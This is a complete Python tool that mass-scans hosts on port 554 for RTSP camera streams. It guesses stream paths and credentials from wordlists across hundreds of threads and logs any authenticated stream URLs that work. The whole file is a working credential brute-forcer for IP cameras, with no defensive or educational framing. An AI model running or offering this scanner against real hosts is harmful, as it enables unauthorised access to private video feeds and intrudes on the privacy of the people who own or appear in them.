#!/usr/bin/env python
from concurrent.futures import ThreadPoolExecutor as TPE
from functools import partial
import re
import socket as so
from time import sleep

from fire import Fire
from tqdm import tqdm

from lib.utils import tim


status_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')


def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 10):
    if cred:
        cred += '@'
    req = (
        f'DESCRIBE rtsp://{cred}{host}:{port}{path} RTSP/1.0\r\n'
        'CSeq: 2\r\n'
        '\r\n'
    )
    while True:
        try:
            with so.socket() as s:
                s.settimeout(timeout)
                s.connect((host, port))
                s.sendall(req.encode())
                response = s.recv(1024).decode()
                return int(status_re.findall(response)[0])
        except so.timeout:
            return 503
        except IOError as e:
            if e.errno in [104, 111]:
                return 503
            print(e)
            sleep(0.25)
        except KeyboardInterrupt:
            raise
        except:
            return 503


def check_cred(host, port, path, cred):
    code = rtsp_req(host, port, path, cred)
    if code == 200:
        print('+', end='', flush=True)
        return f'rtsp://{cred}@{host}:{port}{path}'

    if code == 503:
        print('e', end='', flush=True)
        return

    print('.', end='', flush=True)
    return ''


def check_path(host, port, path):
    if rtsp_req(host, port, path) not in [200, 401, 403]:
        return

    with open('./data/rtsp_creds.txt') as f:
        creds = [ln.rstrip() for ln in f]

    ch = partial(check_cred, host, port, path)

    with TPE(8) as ex:
        for res in ex.map(ch, creds):
            if res is None:
                return
            if res:
                return res


def check_host(host):
    ch = partial(check_path, host, 554)

    with TPE(1) as ex:
        with open('./data/rtsp_paths.txt') as f:
            paths = [ln.rstrip() for ln in f]

        for rr in ex.map(ch, paths):
            if rr is None:
                return
            if rr:
                if '0h84d' in rr:
                    return
                with open('./local/rtsp.txt', 'a') as f:
                    f.write(f'[{tim()}] {rr}\n')
                print('@', end='', flush=True)
                return rr  # first valid path is enough now


def main():
    with open('./local/hosts_554.txt') as f:
        hosts = [ln.rstrip() for ln in f]

    with TPE(256) as ex:
        results = ex.map(check_host, hosts)
        for i, res in enumerate(list(results)):
            if res:
                print()
                print(f'[+ {i}]')
                for url in res:
                    print(url)


if __name__ == "__main__":
    Fire(main)
